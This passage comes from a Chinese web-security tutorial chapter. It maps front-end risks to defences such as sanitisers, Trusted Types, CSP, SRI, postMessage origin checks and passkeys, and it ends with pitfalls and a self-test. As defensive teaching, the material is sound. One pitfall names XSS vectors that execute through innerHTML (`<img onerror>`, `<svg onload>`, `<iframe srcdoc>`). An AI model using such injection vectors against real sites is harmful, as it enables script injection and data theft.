| 用户输入回显后弹窗 | 是否有 `innerHTML` 接收用户内容 | `textContent` / Sanitizer 白名单 | Widely（库）/ Limited（Sanitizer） |
| 富文本要保留格式 | 清洗是否白名单、是否只此一个出口 | Sanitizer + 统一封装 | Limited |
| 新代码又写了 `innerHTML` | 是否有汇聚点强制 | Trusted Types + Report-Only 灰度 | Limited |
| 担心还有未知注入 | 有没有最后一道闸 | CSP nonce + `strict-dynamic` | Widely |
| iframe 消息不可信 | 是否校验 origin/source | 三重校验 + 服务端查证 | Widely |
| 第三方脚本被替换 | 是否配了完整性 | SRI + 锁版本 + 自托管 | Widely |
| 数据被发往陌生域名 | 出站白名单 | `connect-src` | Widely |
| 页面能探测内网 | 是否访问私有地址 | `targetAddressSpace` + 权限策略 | Limited |
| 登录总被钓鱼 | 是否只靠密码 | Passkey + step-up 重新认证 | Widely |
| 迁移域名后用户登不进 | Passkey 的 rpId 绑定 | 旧域过渡 + 新域重注册 | Widely |
| 无法回答「数据存多久」 | 有无保留策略 | 最小化 + 期限 + 删除出口 | — |

## ⚠️ 五个常见坑

1. **用正则「过滤」XSS**：黑名单永远漏一种写法。要么按上下文转义，要么白名单清洗，要么根本不渲染用户 HTML。
2. **以为 `innerHTML` 里的 `<script>` 不执行就安全**：`<img onerror>`、`<svg onload>`、`<iframe srcdoc>` 都会执行。
3. **`postMessage` 用 `'*'` 且不校验 origin**：等于给任意页面开了读、写两个方向的门。
4. **把 Passkey 当唯一登录方式**：旧设备、清空钥匙串、跨域迁移的用户会被永久锁在门外；必须保留邮箱链接或密码通道。
5. **「前端加密」当端到端加密**：页面被注入时，明文在加密前就已经被读走；客户端加密只防服务端与链路。

## ✅ 自测三问

1. 用户评论要支持加粗和链接，你会用 `innerHTML` 还是别的？为什么？（白名单清洗 + `setHTML`；`innerHTML` 会把 `onerror` 一并实例化）
2. 支付 iframe 发来「支付成功」，前端可以据此发货吗？（不可以；前端消息只能触发刷新，发货必须服务端向网关查证）
3. 用户换了新手机，Passkey 不在，怎么让他登进来？（邮箱一次性链接或密码通道；Passkey 只能是并列选项，不能是唯一入口）

## 关键要点

- **XSS 是「数据被当成代码」**：三个入口是拼接 HTML、`innerHTML`、第三方脚本；防御对应「转义、白名单清洗、CSP 与 SRI」。
- **Trusted Types 把风险左移**：让注入汇聚点只接受可信类型，漏一处会在开发时报错，而不是上线后被利用。
- **CSP 是最后一道闸**：`nonce` + `strict-dynamic` 管脚本，`connect-src` 管出站，`base-uri`/`object-src` 堵边角；先用 Report-Only 灰度。
- **来源校验要看三个东西**：`event.origin`、`event.source`、消息结构；回发时 `targetOrigin` 永远写具体值。
- **身份与隐私都靠「不唯一、不长期、不默认」**：Passkey 不做唯一入口、令牌一次一用、数据默认少收少存。

## 延伸阅读

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) ｜ [Trusted Types（web.dev）](https://web.dev/articles/trusted-types)
- [Sanitizer API（MDN）](https://developer.mozilla.org/docs/Web/API/Sanitizer) ｜ [Content Security Policy（MDN）](https://developer.mozilla.org/docs/Web/HTTP/CSP)
- [WebAuthn / Passkey 指南（web.dev）](https://web.dev/articles/passkey-registration) ｜ [Passkeys（FIDO Alliance）](https://fidoalliance.org/passkeys/)
- [Web Crypto API（MDN）](https://developer.mozilla.org/docs/Web/API/Web_Crypto_API) ｜ [Subresource Integrity（MDN）](https://developer.mozilla.org/docs/Web/Security/Subresource_Integrity)
- [Local Network Access（Chrome 文档）](https://developer.chrome.com/blog/local-network-access) ｜ [隐私沙盒与数据最小化](https://web.dev/articles/privacy)

---

← 上一章：[07 性能与 Core Web Vitals](/web/07-performance) ｜ 下一章：[09 Web Components](/web/09-web-components)
